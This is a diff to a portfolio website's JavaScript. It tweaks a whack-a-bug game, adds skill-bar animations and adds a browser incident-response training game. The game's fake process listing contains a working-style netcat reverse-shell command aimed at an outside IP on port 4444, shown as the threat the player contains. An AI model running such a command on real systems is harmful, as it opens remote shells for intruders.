@@ -255,52 +255,52 @@ const SFX = (() => {
   });
 })();
 
-(() => { //info-card
-  const icon = document.getElementById('infoskill');
-  const card = document.getElementById('infoskill-card');
-  if (!icon || !card) return;
+// (() => { //info-card
+//   const icon = document.getElementById('infoskill');
+//   const card = document.getElementById('infoskill-card');
+//   if (!icon || !card) return;
 
-  let hideTimeout = 0;
-  const isCoarse = matchMedia && matchMedia('(pointer: coarse)').matches;
+//   let hideTimeout = 0;
+//   const isCoarse = matchMedia && matchMedia('(pointer: coarse)').matches;
 
-  function show() {
-    window.clearTimeout(hideTimeout);
-    card.classList.add('visible');
-    card.setAttribute('aria-hidden', 'false');
-  }
-  function hide() {
-    window.clearTimeout(hideTimeout);
-    card.classList.remove('visible');
-    card.setAttribute('aria-hidden', 'true');
-  }
-  function delayedHide() {
-    hideTimeout = window.setTimeout(hide, 200);
-  }
+//   function show() {
+//     window.clearTimeout(hideTimeout);
+//     card.classList.add('visible');
+//     card.setAttribute('aria-hidden', 'false');
+//   }
+//   function hide() {
+//     window.clearTimeout(hideTimeout);
+//     card.classList.remove('visible');
+//     card.setAttribute('aria-hidden', 'true');
+//   }
+//   function delayedHide() {
+//     hideTimeout = window.setTimeout(hide, 200);
+//   }
 
-  // Pointer devices: hover
-  icon.addEventListener('mouseenter', () => { if (!isCoarse) show(); });
-  icon.addEventListener('mouseleave', () => { if (!isCoarse) delayedHide(); });
-  card.addEventListener('mouseenter', () => { if (!isCoarse) show(); });
-  card.addEventListener('mouseleave', () => { if (!isCoarse) delayedHide(); });
+//   // Pointer devices: hover
+//   icon.addEventListener('mouseenter', () => { if (!isCoarse) show(); });
+//   icon.addEventListener('mouseleave', () => { if (!isCoarse) delayedHide(); });
+//   card.addEventListener('mouseenter', () => { if (!isCoarse) show(); });
+//   card.addEventListener('mouseleave', () => { if (!isCoarse) delayedHide(); });
 
-  // Click toggles (useful for touch)
-  icon.addEventListener('click', e => { e.stopPropagation(); card.classList.toggle('visible'); card.setAttribute('aria-hidden', card.classList.contains('visible') ? 'false' : 'true'); });
-  card.querySelector('.info-card-close')?.addEventListener('click', () => hide());
+//   // Click toggles (useful for touch)
+//   icon.addEventListener('click', e => { e.stopPropagation(); card.classList.toggle('visible'); card.setAttribute('aria-hidden', card.classList.contains('visible') ? 'false' : 'true'); });
+//   card.querySelector('.info-card-close')?.addEventListener('click', () => hide());
 
-  // Keyboard
-  icon.addEventListener('keydown', e => {
-    if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); card.classList.toggle('visible'); card.setAttribute('aria-hidden', card.classList.contains('visible') ? 'false' : 'true'); }
-    if (e.key === 'Escape') hide();
-  });
+//   // Keyboard
+//   icon.addEventListener('keydown', e => {
+//     if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); card.classList.toggle('visible'); card.setAttribute('aria-hidden', card.classList.contains('visible') ? 'false' : 'true'); }
+//     if (e.key === 'Escape') hide();
+//   });
 
-  // Close when clicking/tapping outside
-  document.addEventListener('click', (e) => {
-    if (!icon.contains(e.target) && !card.contains(e.target)) hide();
-  });
+//   // Close when clicking/tapping outside
+//   document.addEventListener('click', (e) => {
+//     if (!icon.contains(e.target) && !card.contains(e.target)) hide();
+//   });
 
-  // ESC globally
-  document.addEventListener('keydown', (e) => { if (e.key === 'Escape') hide(); });
-})();
+//   // ESC globally
+//   document.addEventListener('keydown', (e) => { if (e.key === 'Escape') hide(); });
+// })();
 
 //custom loader animation for nav-link scroll
 document.querySelectorAll('.nav-link[href^="/#"]').forEach(link => {
@@ -442,6 +442,7 @@ let lastHole;
 let isPlaying = false;
 let score = 0;
 let lives = 3;
+let misses = 0; // Tracks missed bugs
 let peepTimeout;
 
 // Default Speed (Easy Mode)
@@ -470,6 +471,16 @@ function updateLivesUI() {
   else livesDisplay.textContent = '🖤 🖤 🖤';
 }
 
+// Lose 1 life helper function
+function loseLife() {
+  lives--;
+  updateLivesUI();
+
+  if (lives <= 0) {
+    stopGame(true);
+  }
+}
+
 // Pop up bugs or bombs recursively
 function peep() {
   if (!isPlaying) return;
@@ -492,15 +503,30 @@ function peep() {
   hole.classList.add('up');
   
   peepTimeout = setTimeout(() => {
+    // CHECK FOR MISS: If a bug retracts and was NOT clicked, count as a miss
+    if (hole.classList.contains('up') && hole.dataset.type === 'bug' && isPlaying) {
+      misses++;
+      
+      // Flash red border brief warning on missing a bug
+      hole.style.borderColor = '#ff0055';
+      setTimeout(() => hole.style.borderColor = 'var(--stroke)', 200);
+
+      if (misses >= 3) {
+        misses = 0; // Reset miss streak
+        loseLife();  // Deduct 1 heart
+      }
+    }
+
     hole.classList.remove('up');
     if (isPlaying) peep();
   }, speed);
 }
 
-// Reset Score and UI
+// Reset Stats and UI
 function resetStats() {
   score = 0;
   lives = 3;
+  misses = 0;
   scoreBoard.textContent = 0;
   updateLivesUI();
 }
@@ -529,6 +555,7 @@ function stopGame(gameOver = false) {
   holes.forEach(hole => {
     hole.classList.remove('up');
     hole.classList.remove('bomb-hit');
+    hole.style.borderColor = 'var(--stroke)';
   });
   
   // UI Button Resets
@@ -539,7 +566,7 @@ function stopGame(gameOver = false) {
   diffBtns.forEach(btn => btn.disabled = false);
 
   if (gameOver) {
-    alert(`💥 Game Over! You hit 3 bombs! Final Score: ${score}`);
+    alert(`💥 Game Over! Final Score: ${score}`);
   }
 }
 
@@ -564,18 +591,12 @@ holes.forEach(hole => {
         hole.classList.remove('up');
       } 
       else if (type === 'bomb') {
-        lives--;
-        updateLivesUI();
-        
         // Visual feedback for hitting a bomb
         hole.classList.add('bomb-hit');
         hole.classList.remove('up');
         setTimeout(() => hole.classList.remove('bomb-hit'), 200);
 
-        // Game Over condition
-        if (lives <= 0) {
-          stopGame(true);
-        }
+        loseLife();
       }
     }
   });
@@ -594,7 +615,230 @@ diffBtns.forEach(btn => {
     minSpeed = parseInt(e.target.getAttribute('data-speed-min'));
     maxSpeed = parseInt(e.target.getAttribute('data-speed-max'));
 
-    // FIX: Immediately reset score and lives when changing mode
+    // Reset score, lives, and misses when mode changes
     resetStats();
   });
 });
+
+
+//skill bar
+
+document.addEventListener("DOMContentLoaded", () => {
+  const skillLevels = document.querySelectorAll(".skill-level");
+
+  skillLevels.forEach((level) => {
+    // Read percentage value from HTML attribute (e.g., "95%")
+    const targetPercent = level.getAttribute("data-progress") || "0%";
+    const fillBar = level.querySelector(".progress-fill");
+    const percentText = level.querySelector(".progress-percent");
+
+    // 1. Set bar width based on value
+    if (fillBar) {
+      setTimeout(() => {
+        fillBar.style.width = targetPercent;
+      }, 100);
+    }
+
+    // 2. Animate percentage counter text
+    if (percentText) {
+      const numericValue = parseInt(targetPercent, 10) || 0;
+      let current = 0;
+      const stepTime = Math.max(10, Math.floor(1000 / numericValue));
+
+      const timer = setInterval(() => {
+        if (current >= numericValue) {
+          percentText.textContent = `${numericValue}%`;
+          clearInterval(timer);
+        } else {
+          current++;
+          percentText.textContent = `${current}%`;
+        }
+      }, stepTime);
+    }
+  });
+});
+
+//soc start
+
+const socCard = document.getElementById('soc-card');
+const socTerminal = document.getElementById('soc-terminal');
+const socControls = document.getElementById('soc-controls');
+const socSubsystem = document.getElementById('soc-subsystem');
+const socIndicator = document.getElementById('soc-indicator');
+const socStatusText = document.getElementById('soc-status-text');
+const socTimer = document.getElementById('soc-timer');
+const socHealth = document.getElementById('soc-health');
+const socStartBtn = document.getElementById('soc-start-btn');
+
+let health = 100;
+let timeLeft = 180;
+let timerInterval = null;
+let currentStage = 1;
+
+function logTerminal(msg, type = '') {
+  const p = document.createElement('p');
+  p.className = type;
+  p.innerHTML = msg;
+  socTerminal.appendChild(p);
+  socTerminal.scrollTop = socTerminal.scrollHeight;
+}
+
+function updateHealth(delta) {
+  health = Math.max(0, health + delta);
+  socHealth.textContent = `${health}%`;
+
+  if (health < 50 && health > 0) {
+    socCard.classList.add('glitching');
+    logTerminal("⚠️ WARNING: SYSTEM INTEGRITY CRITICAL. SCREEN GLITCHES DETECTED.", "sys-warn");
+  } else {
+    socCard.classList.remove('glitching');
+  }
+
+  if (health === 0) {
+    triggerFailure("CRITICAL SYSTEM COLLAPSE: NO INTEGRITY REMAINING");
+  }
+}
+
+function startTimer() {
+  clearInterval(timerInterval);
+  timerInterval = setInterval(() => {
+    timeLeft--;
+    const mins = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+    const secs = String(timeLeft % 60).padStart(2, '0');
+    socTimer.textContent = `${mins}:${secs}`;
+
+    if (timeLeft <= 0) {
+      clearInterval(timerInterval);
+      triggerFailure("TIME EXPIRED: DATA EXFILTRATION COMPLETE BY ATTACKER");
+    }
+  }, 1000);
+}
+
+function triggerFailure(reason) {
+  clearInterval(timerInterval);
+  socCard.classList.remove('glitching');
+  socCard.classList.add('system-dead');
+  
+  logTerminal(`[FATAL ERROR] ${reason}`, "sys-err");
+  logTerminal("SYSTEM FROZEN / REBOOT REQUIRED", "sys-err");
+
+  socSubsystem.innerHTML = '';
+  socControls.innerHTML = `<button class="button btn-sm" onclick="location.reload()">Hard Reboot System 🔄</button>`;
+}
+
+// STAGE 1: Triage Action
+function loadStage1() {
+  logTerminal("CRITICAL ALERT: Outbound data spike detected on web-server-01 [IP: 10.0.4.12].");
+  logTerminal("Choose immediate triage response action:", "sys-warn");
+
+  socSubsystem.innerHTML = '<p class="sys-msg">Action pending controller choice...</p>';
+  socControls.innerHTML = `
+    <button class="soc-opt-btn" onclick="handleStage1Choice('isolate')">1. Isolate web-server-01 interface</button>
+    <button class="soc-opt-btn" onclick="handleStage1Choice('inspect')">2. Launch Live Command Terminal</button>
+    <button class="soc-opt-btn" onclick="handleStage1Choice('ignore')">3. Mark alert as False Positive</button>
+  `;
+}
+
+function handleStage1Choice(choice) {
+  if (choice === 'ignore') {
+    updateHealth(-100);
+  } else if (choice === 'isolate') {
+    updateHealth(-15);
+    logTerminal("Interface isolated. Server dropped offline. Now investigate local processes.", "sys-warn");
+    loadStage2Terminal();
+  } else {
+    logTerminal("Terminal session initiated. Ready for process inspection.", "sys-success");
+    loadStage2Terminal();
+  }
+}
+
+// STAGE 2: Interactive Terminal Command Execution
+function loadStage2Terminal() {
+  currentStage = 2;
+  logTerminal("STAGE 2: Type <code>ps aux</code> into the terminal input to list running processes.");
+
+  socSubsystem.innerHTML = `
+    <label style="color:#00ff66; font-family:monospace;">SOC-SHELL:~$ </label>
+    <input type="text" id="term-input" class="soc-interactive-input" placeholder="Type ps aux and hit enter..." autofocus />
+  `;
+
+  socControls.innerHTML = '';
+
+  const termInput = document.getElementById('term-input');
+  termInput.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') {
+      const val = termInput.value.trim().toLowerCase();
+      if (val === 'ps aux') {
+        logTerminal("<code>USER  PID  %CPU %MEM COMMAND</code>");
+        logTerminal("<code>root  101  0.1  0.4  /usr/sbin/sshd</code>");
+        logTerminal("<code>www   4821 98.2 2.1  /bin/nc -e /bin/bash 185.220.101.5 4444</code>", "sys-err");
+        logTerminal("Malicious reverse shell found (PID 4821)! Proceed to Port Firewall Containment.", "sys-success");
+        loadStage3Firewall();
+      } else {
+        logTerminal(`Command not recognized: '${val}'. Try typing 'ps aux'`, "sys-err");
+      }
+    }
+  });
+}
+
+// STAGE 3: Port Isolation Switcher
+function loadStage3Firewall() {
+  currentStage = 3;
+  logTerminal("STAGE 3: Block the malicious communication port (Port 4444) immediately!");
+
+  socSubsystem.innerHTML = `
+    <p style="color:#fff; font-family:monospace; margin-bottom:8px;">Active Firewall Rules (Click to BLOCK/UNBLOCK):</p>
+    <div class="port-grid">
+      <button class="port-btn" onclick="togglePort(this, 80)">Port 80 (HTTP)</button>
+      <button class="port-btn" onclick="togglePort(this, 443)">Port 443 (HTTPS)</button>
+      <button class="port-btn" onclick="togglePort(this, 22)">Port 22 (SSH)</button>
+      <button class="port-btn" id="target-port" onclick="togglePort(this, 4444)">Port 4444 (UNKNOWN)</button>
+    </div>
+  `;
+
+  socControls.innerHTML = `
+    <button class="soc-opt-btn" onclick="submitFirewall()">Apply Firewall Rules</button>
+  `;
+}
+
+function togglePort(btn, port) {
+  btn.classList.toggle('blocked');
+}
+
+function submitFirewall() {
+  const targetPortBtn = document.getElementById('target-port');
+  if (targetPortBtn && targetPortBtn.classList.contains('blocked')) {
+    logTerminal("Port 4444 BLOCKED! Outbound command & control tunnel severed.", "sys-success");
+    winGame();
+  } else {
+    updateHealth(-35);
+    logTerminal("ERROR: Port 4444 remains open! Data leak continuing...", "sys-err");
+  }
+}
+
+function winGame() {
+  clearInterval(timerInterval);
+  socCard.classList.remove('glitching');
+  logTerminal("🎉 INCIDENT RESOLVED SUCCESSFULLY!", "sys-success");
+  logTerminal(`Final Security Score: ${health}% | Remaining Time: ${socTimer.textContent}`, "sys-success");
+
+  socSubsystem.innerHTML = '<p class="sys-success">System secured. All threats neutralized.</p>';
+  socControls.innerHTML = `<button class="button btn-sm" onclick="startSimulation()">Play Again 🔄</button>`;
+}
+
+function startSimulation() {
+  health = 100;
+  timeLeft = 180;
+  socCard.classList.remove('glitching', 'system-dead');
+  socHealth.textContent = '100%';
+  socIndicator.classList.add('alert');
+  socStatusText.textContent = 'STATUS: INCIDENT IN PROGRESS';
+  socTerminal.innerHTML = '';
+
+  startTimer();
+  loadStage1();
+}
+
+socStartBtn.addEventListener('click', startSimulation);
+
+//soc end
